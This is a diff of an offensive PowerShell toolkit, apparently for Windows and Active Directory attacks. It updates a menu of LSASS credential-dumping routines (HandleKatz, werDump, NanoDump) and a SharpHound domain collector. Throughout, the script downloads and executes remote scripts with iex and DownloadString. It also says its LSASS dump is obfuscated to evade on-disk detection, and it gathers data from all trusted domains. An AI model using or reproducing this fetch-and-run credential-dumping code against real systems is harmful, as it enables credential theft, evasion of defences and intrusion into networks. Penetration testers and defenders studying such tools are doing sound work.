@@ -668,10 +668,10 @@ __        ___       ____
             
             Switch ($masterquestion) 
             {
-                1{if(isadmin){HandleKatz}}
-                2{if(isadmin){werDump}}
-                3{if(isadmin){Dumplsass}}
-                4{if(isadmin){NanoDumpChoose}}
+                1{if(isadmin){HandleKatz}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                2{if(isadmin){werDump}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                3{if(isadmin){Dumplsass}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                4{if(isadmin){NanoDumpChoose}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
              }
         }
         While ($masterquestion -ne 5)
@@ -773,6 +773,9 @@ function HandleKatz
       
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
       
+      Write-Host "Trying to dump the ID: $dumpid"
+      Sleep 2
+
       Invoke-HandleKatz -handProcID $dumpid
       
       Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
@@ -3291,12 +3294,12 @@ function Sharphound
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
     
     if ($noninteractive)
     {
-        Invoke-Sharphound3 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+        Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
     }
     elseif($alltrustedomains)
     {
@@ -3304,14 +3307,14 @@ function Sharphound
         $TrustedDomains = (Get-ADForest).Domains
         foreach ($TrustedDomain in $TrustedDomains)
         {
-            Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath"
+            Invoke-Sharphound4 -command "-c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath"
         }
         
     }
     else
     {
         $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from: '
-        Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath"
+        Invoke-Sharphound4 -command "-c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath"
     }
 }
 
